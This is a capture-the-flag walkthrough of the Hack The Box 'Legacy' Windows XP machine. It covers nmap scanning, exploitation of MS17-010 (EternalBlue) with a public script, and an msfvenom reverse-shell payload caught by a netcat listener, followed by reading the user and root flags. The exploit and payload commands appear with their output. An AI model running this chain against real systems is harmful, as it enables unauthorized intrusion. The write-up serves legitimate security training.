# Enumeration

```bash
┌──(root💀shiro)-[/home/shiro]
└─# nmap -sC -sV -A 10.10.10.4  
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-02 19:49 +08
Nmap scan report for 10.10.10.4
Host is up (0.0031s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Device type: general purpose|specialized
Running (JUST GUESSING): Microsoft Windows XP|2003|2000|2008 (94%), General Dynamics embedded (88%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_2000::sp4 cpe:/o:microsoft:windows_server_2008::sp2
Aggressive OS guesses: Microsoft Windows XP SP3 (94%), Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows XP (92%), Microsoft Windows Server 2003 SP2 (92%), Microsoft Windows 2003 SP2 (91%), Microsoft Windows 2000 SP4 (91%), Microsoft Windows XP SP2 or Windows Server 2003 (91%), Microsoft Windows XP SP2 or SP3 (91%), Microsoft Windows Server 2003 (90%), Microsoft Windows XP Professional SP3 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 5d00h57m47s, deviation: 1h24m51s, median: 4d23h57m47s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:f2:d3 (VMware)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2022-02-07T15:47:41+02:00

TRACEROUTE (using port 3389/tcp)
HOP RTT     ADDRESS
1   2.99 ms 10.10.14.1
2   3.08 ms 10.10.10.4

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.18 seconds

┌──(root💀shiro)-[/home/shiro]
└─# nmap --script=vuln 10.10.10.4
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-02 19:54 +08
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.10.4
Host is up (0.0037s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE  SERVICE
139/tcp  open   netbios-ssn
445/tcp  open   microsoft-ds
3389/tcp closed ms-wbt-server

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_smb-vuln-ms10-054: false

Nmap done: 1 IP address (1 host up) scanned in 53.77 seconds
```

It seems like this machine is vulnerable to the famous EternalBlue :D

# Exploitation

Let’s search for some possible exploitations using `searchsploit`!

```bash
┌──(root💀shiro)-[/home/shiro]
└─# searchsploit ms17-010            
-------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                          |  Path
-------------------------------------------------------------------------------------------------------- ---------------------------------
Microsoft Windows - 'EternalRomance'/'EternalSynergy'/'EternalChampion' SMB Remote Code Execution (Meta | windows/remote/43970.rb
Microsoft Windows - SMB Remote Code Execution Scanner (MS17-010) (Metasploit)                           | windows/dos/41891.rb
Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)                        | windows/remote/42031.py
Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)    | windows/remote/42315.py
Microsoft Windows 8/8.1/2012 R2 (x64) - 'EternalBlue' SMB Remote Code Execution (MS17-010)              | windows_x86-64/remote/42030.py
Microsoft Windows Server 2008 R2 (x64) - 'SrvOs2FeaToNt' SMB Remote Code Execution (MS17-010)           | windows_x86-64/remote/41987.py
-------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

It seems like none of this will work because our machine is running on `Windows XP`…

A quick Google search brings us to this [Github](https://github.com/helviojunior/MS17-010) repository.

```bash
┌──(root💀shiro)-[/home/shiro/HackTheBox/Legacy]
└─# git clone https://github.com/helviojunior/MS17-010.git
Cloning into 'MS17-010'...
remote: Enumerating objects: 202, done.
remote: Total 202 (delta 0), reused 0 (delta 0), pack-reused 202
Receiving objects: 100% (202/202), 118.50 KiB | 9.88 MiB/s, done.
Resolving deltas: 100% (115/115), done.
                                                                                                                                          
┌──(root💀shiro)-[/home/shiro/HackTheBox/Legacy]
└─# ls
MS17-010
                                                                                                                                          
┌──(root💀shiro)-[/home/shiro/HackTheBox/Legacy]
└─# cd MS17-010 
                                                                                                                                          
┌──(root💀shiro)-[/home/shiro/HackTheBox/Legacy/MS17-010]
└─# ls
BUG.txt                  eternalblue_poc.py       eternalromance_leak.py  eternalsynergy_poc.py  npp_control.py       zzz_exploit.py
checker.py               eternalchampion_leak.py  eternalromance_poc2.py  infoleak_uninit.py     README.md
eternalblue_exploit7.py  eternalchampion_poc2.py  eternalromance_poc.py   mysmb.py               send_and_execute.py
eternalblue_exploit8.py  eternalchampion_poc.py   eternalsynergy_leak.py  mysmb.pyc              shellcode
```

The script we are interested in is the `send_and_execute.py`.

According to the script, we need to send a file to the target.

```python
def send_and_execute(conn, arch):
	smbConn = conn.get_smbconnection()

	filename = "%s.exe" % random_generator(6)
	print "Sending file %s..." % filename


    #In some cases you should change remote file location
    #For example:
    #smb_send_file(smbConn, lfile, 'C', '/windows/temp/%s' % filename)
	#service_exec(conn, r'cmd /c c:\windows\temp\%s' % filename)    
	
	smb_send_file(smbConn, lfile, 'C', '/%s' % filename)
	service_exec(conn, r'cmd /c c:\%s' % filename)
```

So let’s use this `msfvenom` [cheatsheet](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/) to create a payload!

```bash
┌──(root💀shiro)-[/home/shiro/HackTheBox/Legacy/MS17-010]
└─# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=1234 -f exe > legacy.exe                                             2 ⨯
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

Now, let’s open a netcat listener and execute the script OwO

>   Note: if you are having trouble sending executing the python script, run this [pimpmykali](https://github.com/Dewalt-arch/pimpmykali) script to fix your issue UwU

```bash
┌──(root💀shiro)-[/home/shiro/HackTheBox/Legacy/MS17-010]
└─# python send_and_execute.py 10.10.10.4 legacy.exe                                                                                  1 ⨯
Trying to connect to 10.10.10.4:445
Target OS: Windows 5.1
Using named pipe: browser
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x8211c9f8
SESSION: 0xe107bc18
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x78b50
TRANS2: 0x7ac90
modify transaction struct for arbitrary read/write
make this SMB session to be SYSTEM
current TOKEN addr: 0xe21e0998
userAndGroupCount: 0x3
userAndGroupsAddr: 0xe21e0a38
overwriting token UserAndGroups
Sending file Y3WFFT.exe...
Opening SVCManager on 10.10.10.4.....
Creating service DufB.....
Starting service DufB.....
The NETBIOS connection with the remote host timed out.
Removing service DufB.....
ServiceExec Error on: 10.10.10.4
nca_s_proto_error
Done

┌──(root💀shiro)-[/home/shiro]
└─# nc -nlvp 1234                                                                                                                     
listening on [any] 1234 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.4] 1032
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>cd ../..   	
cd ../..

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\

16/03/2017  07:30 ��                 0 AUTOEXEC.BAT
16/03/2017  07:30 ��                 0 CONFIG.SYS
16/03/2017  08:07 ��    <DIR>          Documents and Settings
07/02/2022  04:28 ��            73.802 ESQL0Q.exe
29/12/2017  10:41 ��    <DIR>          Program Files
07/02/2022  03:44 ��    <DIR>          WINDOWS
07/02/2022  04:25 ��            73.802 Y3WFFT.exe
               4 File(s)        147.604 bytes
               3 Dir(s)   6.297.550.848 bytes free

C:\>cd Documents and Settings
cd Documents and Settings

C:\Documents and Settings>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings

16/03/2017  08:07 ��    <DIR>          .
16/03/2017  08:07 ��    <DIR>          ..
16/03/2017  08:07 ��    <DIR>          Administrator
16/03/2017  07:29 ��    <DIR>          All Users
16/03/2017  07:33 ��    <DIR>          john
               0 File(s)              0 bytes
               5 Dir(s)   6.297.546.752 bytes free

C:\Documents and Settings>cd john
cd john

C:\Documents and Settings\john>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\john

16/03/2017  07:33 ��    <DIR>          .
16/03/2017  07:33 ��    <DIR>          ..
16/03/2017  08:19 ��    <DIR>          Desktop
16/03/2017  07:33 ��    <DIR>          Favorites
16/03/2017  07:33 ��    <DIR>          My Documents
16/03/2017  07:20 ��    <DIR>          Start Menu
               0 File(s)              0 bytes
               6 Dir(s)   6.297.546.752 bytes free

C:\Documents and Settings\john>cd Desktop
cd Desktop

C:\Documents and Settings\john\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\john\Desktop

16/03/2017  08:19 ��    <DIR>          .
16/03/2017  08:19 ��    <DIR>          ..
16/03/2017  08:19 ��                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)   6.297.546.752 bytes free

C:\Documents and Settings\john\Desktop>type user.txt
type user.txt
e69af0e4f443de7e36876fda4ec7644f

C:\Documents and Settings\john\Desktop>cd ../../
cd ../../

C:\Documents and Settings>dir 
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings

16/03/2017  08:07 ��    <DIR>          .
16/03/2017  08:07 ��    <DIR>          ..
16/03/2017  08:07 ��    <DIR>          Administrator
16/03/2017  07:29 ��    <DIR>          All Users
16/03/2017  07:33 ��    <DIR>          john
               0 File(s)              0 bytes
               5 Dir(s)   6.297.542.656 bytes free

C:\Documents and Settings>cd Administrator
cd Administrator

C:\Documents and Settings\Administrator>cd Desktop
cd Desktop

C:\Documents and Settings\Administrator\Desktop>type root.txt
type root.txt
993442d258b0e0ec917cae9e695d5713
```